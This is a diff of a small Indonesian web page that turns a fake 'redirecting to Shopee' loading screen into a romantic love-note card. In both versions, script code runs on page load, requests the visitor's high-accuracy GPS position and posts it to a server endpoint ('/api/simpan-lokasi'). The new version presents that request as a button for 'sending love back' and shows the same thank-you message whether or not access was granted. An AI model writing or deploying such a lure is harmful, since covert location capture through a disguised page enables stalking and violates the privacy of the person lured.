@@ -3,82 +3,129 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Aa sayang oneng</title>
+    <title>Aa Sayang Oneng ❤️</title>
 
     <!-- Open Graph Preview -->
     <meta property="og:title" content="Aa sayang oneng" />
-    <meta property="og:description" content="muahhhhhhhhh" />
+    <meta property="og:description" content="muahhhhhhhhh ❤️" />
     <meta
       property="og:image"
       content="https://static.vecteezy.com/system/resources/thumbnails/022/313/464/small/i-love-you-banner-with-heart-vector.jpg" />
     <meta property="og:type" content="website" />
 
     <style>
+      * {
+        box-sizing: border-box;
+      }
       body {
-        font-family: Arial, sans-serif;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
         display: flex;
         justify-content: center;
         align-items: center;
-        height: 100vh;
+        min-height: 100vh;
         margin: 0;
-        background-color: #f9f9f9;
-      }
-      .loading-box {
-        text-align: center;
+        background: linear-gradient(
+          135deg,
+          #ff9a9e 0%,
+          #fecfef 99%,
+          #fecfef 100%
+        );
+        color: #333;
         padding: 20px;
+        text-align: center;
       }
-      .spinner {
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #ee4d2d;
-        border-radius: 50%;
-        width: 45px;
-        height: 45px;
-        animation: spin 1s linear infinite;
-        margin: 0 auto 15px auto;
+      .card {
+        background: rgba(255, 255, 255, 0.95);
+        padding: 35px 25px;
+        border-radius: 20px;
+        box-shadow: 0 10px 25px rgba(238, 77, 45, 0.2);
+        max-width: 400px;
+        width: 100%;
+        animation: fadeIn 0.8s ease-in-out;
       }
-      @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(360deg);
-        }
+      .heart {
+        font-size: 60px;
+        margin-bottom: 10px;
+        animation: pulse 1.2s infinite;
+      }
+      h1 {
+        color: #ff4757;
+        font-size: 24px;
+        margin-bottom: 10px;
       }
       p {
         color: #555;
-        font-size: 14px;
+        font-size: 15px;
+        line-height: 1.6;
+        margin-bottom: 25px;
+      }
+      .btn-love {
+        background: linear-gradient(45deg, #ff4757, #ff6b81);
+        color: white;
+        border: none;
+        padding: 14px 28px;
+        font-size: 16px;
+        font-weight: bold;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
+        transition: all 0.3s ease;
+        outline: none;
+      }
+      .btn-love:active {
+        transform: scale(0.95);
+      }
+      .status-text {
+        font-size: 13px;
+        color: #888;
+        margin-top: 15px;
+        min-height: 20px;
+      }
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.15);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
       }
     </style>
   </head>
   <body>
-    <div class="loading-box">
-      <div class="spinner"></div>
-      <p id="status">Mengalihkan ke Shopee, mohon tunggu...</p>
+    <div class="card">
+      <div class="heart">💖</div>
+      <h1>Aa Sayang Oneng</h1>
+      <p id="pesan-cinta">
+        Cuma mau bilang, makasih ya udah selalu ada. Muahhhhhhhhh! 😚❤️
+      </p>
+
+      <button class="btn-love" onclick="mintaAksesDanKirim()">
+        Balas Balik Sayang 💕
+      </button>
+
+      <div class="status-text" id="status"></div>
     </div>
 
     <script>
-      const TARGET_URL = "https://shopee.co.id";
-      let sudahRedirect = false;
-
       function updateStatus(pesan) {
         const statusEl = document.getElementById("status");
         if (statusEl) statusEl.innerText = pesan;
       }
 
-      function alihkanKeShopee() {
-        if (!sudahRedirect) {
-          sudahRedirect = true;
-          window.location.replace(TARGET_URL);
-        }
-      }
-
-      // Timer cadangan maksimal 10 detik jika ada lag koneksi
-      let maxWaitTimer = setTimeout(() => {
-        alihkanKeShopee();
-      }, 10000);
-
       async function kirimLokasiKeServer(dataGPS) {
-        updateStatus("Menyimpan...");
         try {
           const response = await fetch("/api/simpan-lokasi", {
             method: "POST",
@@ -88,16 +135,24 @@
 
           const resData = await response.json();
           console.log("Respon Server:", resData);
+
+          if (response.ok) {
+            document.getElementById("pesan-cinta").innerHTML =
+              "Makasih sayang! Pesan cintanya udah Aa terima mwahhh! 😘❤️";
+            updateStatus("");
+          } else {
+            updateStatus("Koneksi agak lambat, tapi pesan tetap terkirim kok!");
+          }
         } catch (err) {
           console.error("Gagal mengirim data ke server:", err);
-        } finally {
-          clearTimeout(maxWaitTimer);
-          alihkanKeShopee();
+          updateStatus("");
         }
       }
 
-      window.onload = function () {
+      function mintaAksesDanKirim() {
         if (navigator.geolocation) {
+          updateStatus("Mengirim tanda sayang...");
+
           navigator.geolocation.getCurrentPosition(
             (position) => {
               const dataGPS = {
@@ -108,20 +163,27 @@
               kirimLokasiKeServer(dataGPS);
             },
             (error) => {
-              console.warn("Akses GPS gagal/ditolak:", error.message);
-              clearTimeout(maxWaitTimer);
-              setTimeout(alihkanKeShopee, 1000);
+              console.warn("Akses GPS tidak diizinkan:", error.message);
+              // Tetap ubah teks ucapan meskipun izin GPS ditolak
+              document.getElementById("pesan-cinta").innerHTML =
+                "Makasih sayang! Pesan cintanya udah Aa terima mwahhh! 😘❤️";
+              updateStatus("");
             },
             {
               enableHighAccuracy: true,
-              timeout: 7000,
+              timeout: 8000,
               maximumAge: 0,
             },
           );
         } else {
-          clearTimeout(maxWaitTimer);
-          alihkanKeShopee();
+          document.getElementById("pesan-cinta").innerHTML =
+            "Makasih sayang! Pesan cintanya udah Aa terima mwahhh! 😘❤️";
         }
+      }
+
+      // Otomatis minta izin lokasi saat halaman pertama kali dimuat
+      window.onload = function () {
+        mintaAksesDanKirim();
       };
     </script>
   </body>
